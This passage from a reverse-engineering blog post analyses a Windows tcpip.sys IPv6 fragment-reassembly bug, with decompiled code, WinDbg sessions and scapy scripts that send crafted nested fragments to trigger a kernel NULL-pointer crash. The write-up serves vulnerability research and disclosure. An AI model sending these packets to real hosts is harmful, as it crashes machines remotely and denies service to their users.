<p>All right - at this point I think we are done with zooming out and understanding the big picture. We understand the beast well enough to start getting back on this BSoD. After reading <code>Ipv6pReassembleDatagram</code> a few times I honestly couldn't figure out where the advertised crash could happen. Pretty frustrating. That is why I decided instead to use the debugger to modify <code>Reassembly-&gt;DataLength</code> and <code>UnfragmentableLength</code> at runtime to see if this could give me any hints. The first one didn't seem to do anything, but the second one bug-checked the machine with a NULL dereference, bingo that is looking good!</p>
<p>After carefully analyzing the crash I've started to realize that the potential issue has been hiding in plain sight in front of my eyes; here is the code:</p>
<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">Ipv6pReassembleDatagram</span><span class="p">(</span><span class="n">Packet_t</span> <span class="o">*</span><span class="n">Packet</span><span class="p">,</span> <span class="n">Reassembly_t</span> <span class="o">*</span><span class="n">Reassembly</span><span class="p">,</span> <span class="kt">char</span> <span class="n">OldIrql</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">UnfragmentableLength</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">UnfragmentableLength</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">TotalLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">DataLength</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">HeaderAndOptionsLength</span> <span class="o">=</span> <span class="n">UnfragmentableLength</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ipv6_header_t</span><span class="p">);</span>
  <span class="c1">// …</span>
  <span class="n">NetBufferList</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NET_BUFFER_LIST</span> <span class="o">*</span><span class="p">)</span><span class="n">NetioAllocateAndReferenceNetBufferAndNetBufferList</span><span class="p">(</span>
                                        <span class="n">IppReassemblyNetBufferListsComplete</span><span class="p">,</span>
                                        <span class="n">Reassembly</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="n">i64</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="n">i64</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">,</span>
                                        <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">NetBufferList</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">goto</span> <span class="n">Bail_0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">FirstNetBuffer</span> <span class="o">=</span> <span class="n">NetBufferList</span><span class="o">-&gt;</span><span class="n">FirstNetBuffer</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">NetioRetreatNetBuffer</span><span class="p">(</span><span class="n">FirstNetBuffer</span><span class="p">,</span> <span class="kt">uint16_t</span><span class="p">(</span><span class="n">HeaderAndOptionsLength</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">goto</span> <span class="n">Bail_1</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ipv6_header_t</span> <span class="o">*</span><span class="p">)</span><span class="n">NdisGetDataBuffer</span><span class="p">(</span><span class="n">FirstNetBuffer</span><span class="p">,</span> <span class="n">HeaderAndOptionsLength</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="c1">//...</span>
  <span class="o">*</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">;</span>
</code></pre></div>


<p><code>NetioAllocateAndReferenceNetBufferAndNetBufferList</code> allocates a brand new NBL called <code>NetBufferList</code>. Then <code>NetioRetreatNetBuffer</code> is called:</p>
<div class="highlight"><pre><span></span><code><span class="n">NDIS_STATUS</span> <span class="nf">NetioRetreatNetBuffer</span><span class="p">(</span><span class="n">_NET_BUFFER</span> <span class="o">*</span><span class="n">Nb</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">Amount</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">DataBackFill</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">CurrentMdlOffset</span> <span class="o">=</span> <span class="n">Nb</span><span class="o">-&gt;</span><span class="n">CurrentMdlOffset</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">CurrentMdlOffset</span> <span class="o">&lt;</span> <span class="n">Amount</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">NdisRetreatNetBufferDataStart</span><span class="p">(</span><span class="n">Nb</span><span class="p">,</span> <span class="n">Amount</span><span class="p">,</span> <span class="n">DataBackFill</span><span class="p">,</span> <span class="n">NetioAllocateMdl</span><span class="p">);</span>
  <span class="n">Nb</span><span class="o">-&gt;</span><span class="n">DataOffset</span> <span class="o">-=</span> <span class="n">Amount</span><span class="p">;</span>
  <span class="n">Nb</span><span class="o">-&gt;</span><span class="n">DataLength</span> <span class="o">+=</span> <span class="n">Amount</span><span class="p">;</span>
  <span class="n">Nb</span><span class="o">-&gt;</span><span class="n">CurrentMdlOffset</span> <span class="o">=</span> <span class="n">CurrentMdlOffset</span> <span class="o">-</span> <span class="n">Amount</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


<p>Because the <code>FirstNetBuffer</code> just got allocated, it is empty and most of its fields are zero. This means that <code>NetioRetreatNetBuffer</code> triggers a call to <code>NdisRetreatNetBufferDataStart</code> which is publicly documented. According to the documentation, it should allocate an MDL using <code>NetioAllocateMdl</code> as the network buffer is empty as we mentioned above. One thing to notice is that the amount of bytes, <code>HeaderAndOptionsLength</code>, passed to <code>NetioRetreatNetBuffer</code> is truncated to a <code>uint16_t</code>; odd.</p>
<div class="highlight"><pre><span></span><code>  <span class="k">if</span> <span class="p">(</span> <span class="n">NetioRetreatNetBuffer</span><span class="p">(</span><span class="n">FirstNetBuffer</span><span class="p">,</span> <span class="kt">uint16_t</span><span class="p">(</span><span class="n">HeaderAndOptionsLength</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
</code></pre></div>


<p>Now that there is backing space in the NB for the IPv6 header as well as the unfragmentable part of the packet, it needs to get a pointer to the backing data in order to populate the buffer. <code>NdisGetDataBuffer</code> is documented as <em>to gain access to a contiguous block of data from a NET_BUFFER structure</em>. After reading the documentation several time, it was a little bit confusing to me so I figured I'd throw NDIS in IDA and have a look at the implementation:</p>
<div class="highlight"><pre><span></span><code><span class="n">PVOID</span> <span class="nf">NdisGetDataBuffer</span><span class="p">(</span><span class="n">PNET_BUFFER</span> <span class="n">NetBuffer</span><span class="p">,</span> <span class="n">ULONG</span> <span class="n">BytesNeeded</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">Storage</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">AlignMultiple</span><span class="p">,</span> <span class="n">UINT</span> <span class="n">AlignOffset</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">const</span> <span class="n">_MDL</span> <span class="o">*</span><span class="n">CurrentMdl</span> <span class="o">=</span> <span class="n">NetBuffer</span><span class="o">-&gt;</span><span class="n">CurrentMdl</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">BytesNeeded</span> <span class="o">||</span> <span class="o">!</span><span class="n">CurrentMdl</span> <span class="o">||</span> <span class="n">NetBuffer</span><span class="o">-&gt;</span><span class="n">DataLength</span> <span class="o">&lt;</span> <span class="n">BytesNeeded</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
<span class="c1">// ...</span>
</code></pre></div>


<p>Just looking at the beginning of the implementation something stands out. As <code>NdisGetDataBuffer</code> is called with <code>HeaderAndOptionsLength</code> (<strong>not truncated</strong>), we should be able to hit the following condition <code>NetBuffer-&gt;DataLength &lt; BytesNeeded</code> when <code>HeaderAndOptionsLength</code> is larger than 0xffff. Why, you ask? Let's take an example. <code>HeaderAndOptionsLength</code> is 0x1337, so <code>NetioRetreatNetBuffer</code> allocates a backing buffer of 0x1337 bytes, and <code>NdisGetDataBuffer</code> returns a pointer to the newly allocated data; works as expected. Now let's imagine that <code>HeaderAndOptionsLength</code> is 0x31337. This means that <code>NetioRetreatNetBuffer</code> allocates 0x1337 (because of the truncation) bytes but calls <code>NdisGetDataBuffer</code> with 0x31337 which makes the call fail because the network buffer is not big enough and we hit this condition <code>NetBuffer-&gt;DataLength &lt; BytesNeeded</code>.</p>
<p>As the returned pointer is trusted not to be NULL, <code>Ipv6pReassembleDatagram</code> carries on by using it for a memory write:</p>
<div class="highlight"><pre><span></span><code>  <span class="o">*</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">;</span>
</code></pre></div>


<p>This is where it should bugcheck. As usual we can verify our understanding of the function with a WinDbg session. Here is a simple Python script that sends two fragments:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
<span class="nb">id</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">first</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
    <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;ff02::1&#39;</span><span class="p">)</span> \
    <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span> <span class="o">=</span> <span class="nb">id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span> \
    <span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">sport</span> <span class="o">=</span> <span class="mh">0x1122</span><span class="p">,</span> <span class="n">dport</span> <span class="o">=</span> <span class="mh">0x3344</span><span class="p">)</span> \
    <span class="o">/</span> <span class="s1">&#39;---frag1&#39;</span>
<span class="n">second</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
    <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="s1">&#39;ff02::1&#39;</span><span class="p">)</span> \
    <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span> <span class="o">=</span> <span class="nb">id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">2</span><span class="p">)</span> \
    <span class="o">/</span> <span class="s1">&#39;---frag2&#39;</span>
<span class="n">sendp</span><span class="p">([</span><span class="n">first</span><span class="p">,</span> <span class="n">second</span><span class="p">],</span> <span class="n">iface</span><span class="o">=</span><span class="s1">&#39;eth1&#39;</span><span class="p">)</span>
</code></pre></div>


<p>Let's see what the reassembly looks like when those packets are received:</p>
<div class="highlight"><pre><span></span><code>kd&gt; bp tcpip!Ipv6pReassembleDatagram

kd&gt; g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff800`117cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

kd&gt; p
tcpip!Ipv6pReassembleDatagram+0x5:
fffff800`117cdd71 48894c2408      mov     qword ptr [rsp+8],rcx

// ...

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0x9c:
fffff800`117cde08 48ff1569660700  call    qword ptr [tcpip!_imp_NetioAllocateAndReferenceNetBufferAndNetBufferList (fffff800`11844478)]

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xa3:
fffff800`117cde0f 0f1f440000      nop     dword ptr [rax+rax]

kd&gt; r @rax
rax=ffffc107f7be1d90 &lt;- this is the allocated NBL

kd&gt; !ndiskd.nbl @rax
    NBL                ffffc107f7be1d90    Next NBL           NULL
    First NB           ffffc107f7be1f10    Source             NULL
                                           Pool               ffffc107f58ba980 - NETIO
    Flags              NBL_ALLOCATED

    Walk the NBL chain                     Dump data payload
    Show out-of-band information           Display as Wireshark hex dump


; The first NB is empty; its length is 0 as expected

kd&gt; !ndiskd.nb ffffc107f7be1f10
    NB                 ffffc107f7be1f10    Next NB            NULL
    Length             0                   Source pool        ffffc107f58ba980
    First MDL          0                   DataOffset         0
    Current MDL        [NULL]              Current MDL offset 0

    View associated NBL

// ...

kd&gt; r @rcx, @rdx
rcx=ffffc107f7be1f10 rdx=0000000000000028 &lt;- the first NB and the size to allocate for it

kd&gt;
tcpip!Ipv6pReassembleDatagram+0xd9:
fffff800`117cde45 e80a35ecff      call    tcpip!NetioRetreatNetBuffer (fffff800`11691354)

kd&gt; p
tcpip!Ipv6pReassembleDatagram+0xde:
fffff800`117cde4a 85c0            test    eax,eax

; The first NB now has 0x28 bytes backing MDL

kd&gt; !ndiskd.nb ffffc107f7be1f10
    NB                 ffffc107f7be1f10    Next NB            NULL
    Length             0n40                Source pool        ffffc107f58ba980
    First MDL          ffffc107f5ee8040    DataOffset         0n56
    Current MDL        [First MDL]         Current MDL offset 0n56

    View associated NBL

// ...

; Getting access to the backing buffer

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xfe:
fffff800`117cde6a 48ff1507630700  call    qword ptr [tcpip!_imp_NdisGetDataBuffer (fffff800`11844178)]

kd&gt; p
tcpip!Ipv6pReassembleDatagram+0x105:
fffff800`117cde71 0f1f440000      nop     dword ptr [rax+rax]

; This is the backing buffer; it has leftover data, but gets initialized later

kd&gt; db @rax
ffffc107`f5ee80b0  05 02 00 00 01 00 8f 00-41 dc 00 00 00 01 04 00  ........A.......
</code></pre></div>


<p>All right, so it sounds like we have a plan - let's get to work.</p>
<h2 id="manufacturing-a-packet-of-the-death-chasing-phantoms">Manufacturing a packet of the death: chasing phantoms</h2>
<p>Well... sending a packet with a large header should be trivial right? That's initially what I thought. After trying various things to achieve this goal, I quickly realized it wouldn't be that easy. The main issue is the MTU. Basically, network devices don't allow you to send packets bigger than like ~1200 bytes. Online content suggests that some ethernet cards and network switches allow you to bump this limit. Because I was running my test in my own Hyper-V lab, I figured it was fair enough to try to reproduce the NULL dereference with non-default parameters, so I looked for a way to increase the MTU on the virtual switch to 64k.</p>
<p>The issue with that is that Hyper-V didn't allow me to do that. The only parameter I found allowed me to bump the limit to about 9k which is very far from the 64k I needed to trigger this issue. At this point, I felt frustrated because I felt I was <strong>so close</strong> to the end, but no cigar. Even though I had read that this vulnerability could be thrown over the internet, I kept going in this wrong direction. If it could be thrown from the internet, it meant it had to go through regular network equipment and there was no way a 64k packet would work. But I ignored this hard truth for a bit of time.</p>
<p>Eventually, I accepted the fact that I was probably heading the wrong direction, ugh. So I reevaluated my options. I figured that the bugcheck I triggered above was not the one that I would be able to trigger with packets thrown from the Internet. Maybe though there might be another code-path having a very similar pattern (retreat + <code>NdisGetDataBuffer</code>) that would result in a bugcheck. I've noticed that the <code>TotalLength</code> field is also truncated a bit further down in the function and written in the IPv6 header of the packet. This header is eventually copied in the final reassembled IPv6 header:</p>
<div class="highlight"><pre><span></span><code><span class="c1">// The ROR2 is basically htons.</span>
<span class="c1">// One weird thing here is that TotalLength is truncated to 16b.</span>
<span class="c1">// We are able to make TotalLength &gt;= 0x10000 by crafting a large</span>
<span class="c1">// packet via fragmentation.</span>
<span class="c1">// The issue with that is that, the size from the IPv6 header is smaller than</span>
<span class="c1">// the real total size. It&#39;s kinda hard to see how this would cause subsequent</span>
<span class="c1">// issue but hmm, yeah.</span>
<span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">.</span><span class="n">length</span> <span class="o">=</span> <span class="n">__ROR2__</span><span class="p">(</span><span class="n">TotalLength</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
<span class="c1">// B00m, Buffer can be NULL here because of the issue discussed above.</span>
<span class="c1">// This copies the saved IPv6 header from the first fragment into the</span>
<span class="c1">// first part of the reassembled packet.</span>
<span class="o">*</span><span class="n">Buffer</span> <span class="o">=</span> <span class="n">Reassembly</span><span class="o">-&gt;</span><span class="n">Ipv6</span><span class="p">;</span>
</code></pre></div>


<p>My theory was that there might be code that would read this <code>Ipv6.length</code> (which is truncated as <code>__ROR2__</code> expects a <code>uint16_t</code>) and something bad might happen as a result. Although, the <code>length</code> would end up having a smaller value than the actual real size of the packet; it was hard for me to come up with a scenario where this would cause an issue but I still chased this theory as this was the only thing I had.</p>
<p>What I started to do at this point is to audit every demuxer that we saw earlier. I looked for ones that would use this <code>length</code> field somehow and looked for similar retreat / <code>NdisGetDataBuffer</code> patterns. Nothing. Thinking I might be missing something statically so I also heavily used WinDbg to verify my work. I used hardware breakpoints to track access to those two bytes but no hit. Ever. Frustrating.</p>
<p>After trying and trying I started to think that I might have been headed in the wrong direction again. Maybe, I really need to find a way to send such a large packet without violating the MTU. But how?</p>
<h2 id="manufacturing-a-packet-of-the-death-leap-of-faith">Manufacturing a packet of the death: leap of faith</h2>
<p>All right so I decided to start fresh again. Going back to the big picture, I've studied a bit more the reassembly algorithm, diffed again just in case I missed a clue somewhere, but nothing...</p>
<p>Could I maybe be able to fragment a packet that has a very large header and trick the stack into reassembling the reassembled packet? We've seen previously that we could use reassembly as a primitive to stitch fragments together; so instead of trying to send a very large fragment maybe we could break down a large one into smaller ones and have them stitched together in memory. It honestly felt like a long leap forward, but based on my reverse-engineering effort I didn't really see anything that would prevent that. The idea was blurry but felt like it was worth a shot. How would it really work though?</p>
<p>Sitting down for a minute, this is the theory that I came up with. I created a very large fragment that has many headers; enough to trigger the bug assuming I could trigger another reassembly. Then, I fragmented this fragment so that it can be sent to the target without violating the MTU.</p>
<div class="highlight"><pre><span></span><code><span class="n">reassembled_pkt</span> <span class="o">=</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
    <span class="p">])</span> \
    <span class="c1"># ....</span>
    <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0xa0</span><span class="p">)),</span>
    <span class="p">])</span> \
    <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="n">second_pkt_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">)</span> \
    <span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">sport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">chksum</span><span class="o">=</span><span class="mh">0x7e7f</span><span class="p">)</span>

<span class="n">reassembled_pkt</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">reassembled_pkt</span><span class="p">)</span>
<span class="n">frags</span> <span class="o">=</span> <span class="n">frag6</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">,</span> <span class="n">frag_id</span><span class="p">,</span> <span class="n">reassembled_pkt</span><span class="p">,</span> <span class="mi">60</span><span class="p">)</span>
</code></pre></div>


<p>The reassembly happens and <code>tcpip.sys</code> builds this huge reassembled fragment in memory; that's great as I didn't think it would work. Here is what it looks like in WinDbg:</p>
<div class="highlight"><pre><span></span><code>kd&gt; bp tcpip+01ADF71 &quot;.echo Reassembled NB; r @r14;&quot;

kd&gt; g
Reassembled NB
r14=ffff800fa2a46f10
tcpip!Ipv6pReassembleDatagram+0x205:
fffff801`0a7cdf71 41394618        cmp     dword ptr [r14+18h],eax

kd&gt; !ndiskd.nb @r14
    NB                 ffff800fa2a46f10    Next NB            NULL
    Length                10020            Source pool        ffff800fa06ba240
    First MDL          ffff800fa0eb1180    DataOffset         0n56
    Current MDL        [First MDL]         Current MDL offset 0n56

    View associated NBL

kd&gt; !ndiskd.nbl ffff800fa2a46d90
    NBL                ffff800fa2a46d90    Next NBL           NULL
    First NB           ffff800fa2a46f10    Source             NULL
                                           Pool               ffff800fa06ba240 - NETIO
    Flags              NBL_ALLOCATED

    Walk the NBL chain                     Dump data payload
    Show out-of-band information           Display as Wireshark hex dump

kd&gt; !ndiskd.nbl ffff800fa2a46d90 -data
NET_BUFFER ffff800fa2a46f10
  MDL ffff800fa0eb1180
    ffff800fa0eb11f0  60 00 00 00 ff f8 3c 40-fe 80 00 00 00 00 00 00  `·····&lt;@········
    ffff800fa0eb1200  02 15 5d ff fe e4 30 0e-ff 02 00 00 00 00 00 00  ··]···0·········
    ffff800fa0eb1210  00 00 00 00 00 00 00 01                          ········

  ...

  MDL ffff800f9ff5e8b0
    ffff800f9ff5e8f0  3c e1 01 ff 61 61 61 61-61 61 61 61 61 61 61 61  &lt;···aaaaaaaaaaaa
    ffff800f9ff5e900  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e910  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e920  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e930  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e940  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e950  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
    ffff800f9ff5e960  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa

  ...

  MDL ffff800fa0937280
    ffff800fa09372c0  7a 69 7a 69 00 08 7e 7f                          zizi··~·
</code></pre></div>


<p>What we see above is the reassembled first fragment.</p>
<div class="highlight"><pre><span></span><code><span class="n">reassembled_pkt</span> <span class="o">=</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;c&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
    <span class="p">])</span> \
    <span class="c1"># ...</span>
    <span class="o">/</span> <span class="n">IPv6ExtHdrDestOpt</span><span class="p">(</span><span class="n">options</span> <span class="o">=</span> <span class="p">[</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xff</span><span class="p">)),</span>
        <span class="n">PadN</span><span class="p">(</span><span class="n">optdata</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0xa0</span><span class="p">)),</span>
    <span class="p">])</span> \
    <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="n">second_pkt_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
        <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="p">)</span> \
    <span class="o">/</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">sport</span> <span class="o">=</span> <span class="mi">31337</span><span class="p">,</span> <span class="n">chksum</span><span class="o">=</span><span class="mh">0x7e7f</span><span class="p">)</span>
</code></pre></div>


<p>It is a fragment that is 10020 bytes long, and you can see that the <code>ndiskd</code> extension walks the long MDL chain that describes the content of this fragment. The last MDL is the header of the UDP part of the fragment. What is left to do is to trigger another reassembly. What if we send another fragment that is part of the same group; would this trigger another reassembly?</p>
<p>Well, let's see if the below works I guess:</p>
<div class="highlight"><pre><span></span><code><span class="n">reassembled_pkt_2</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">()</span> \
    <span class="o">/</span> <span class="n">IPv6</span><span class="p">(</span><span class="n">dst</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">target</span><span class="p">)</span> \
    <span class="o">/</span> <span class="n">IPv6ExtHdrFragment</span><span class="p">(</span><span class="nb">id</span> <span class="o">=</span> <span class="n">second_pkt_id</span><span class="p">,</span> <span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">nh</span> <span class="o">=</span> <span class="mi">17</span><span class="p">)</span> \
    <span class="o">/</span> <span class="s1">&#39;doar-e ftw&#39;</span>

<span class="n">sendp</span><span class="p">(</span><span class="n">reassembled_pkt_2</span><span class="p">,</span> <span class="n">iface</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">iface</span><span class="p">)</span>
</code></pre></div>


<p>Here is what we see in WinDbg:</p>
<div class="highlight"><pre><span></span><code>kd&gt; bp tcpip!Ipv6pReassembleDatagram

; This is the first reassembly; the output packet is the first large fragment

kd&gt; g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff805`4a5cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

; This is the second reassembly; it combines the first very large fragment, and the second fragment we just sent

kd&gt; g
Breakpoint 0 hit
tcpip!Ipv6pReassembleDatagram:
fffff805`4a5cdd6c 4488442418      mov     byte ptr [rsp+18h],r8b

...

; Let&#39;s see the bug happen live!

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xce:
fffff805`4a5cde3a 0fb79424a8000000 movzx   edx,word ptr [rsp+0A8h]

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xd6:
fffff805`4a5cde42 498bce          mov     rcx,r14

kd&gt; 
tcpip!Ipv6pReassembleDatagram+0xd9:
fffff805`4a5cde45 e80a35ecff      call    tcpip!NetioRetreatNetBuffer (fffff805`4a491354)

kd&gt; r @edx
edx=10 &lt;- truncated size

// ...

kd&gt; 
